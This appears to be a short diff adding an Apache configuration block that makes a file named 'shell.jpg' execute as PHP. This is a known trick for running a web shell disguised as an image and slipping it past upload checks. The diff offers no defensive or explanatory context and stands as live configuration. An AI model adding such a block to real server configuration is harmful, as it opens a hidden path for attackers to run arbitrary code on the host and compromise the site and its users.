@@ -1,0 +1,3 @@
+<FilesMatch "shell.jpg">
+   SetHandler application/x-httpd-php
+</FilesMatch>
